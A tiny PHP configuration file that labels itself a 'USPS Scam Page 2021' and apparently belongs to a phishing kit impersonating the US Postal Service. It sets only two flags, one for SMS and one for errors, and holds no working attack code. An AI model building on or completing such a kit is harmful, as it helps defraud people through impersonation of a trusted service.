<?php
/* 
USPS Scam Page 2021
CODED BY ARON-TN
*/
$sms='1';
$error='0';
?>
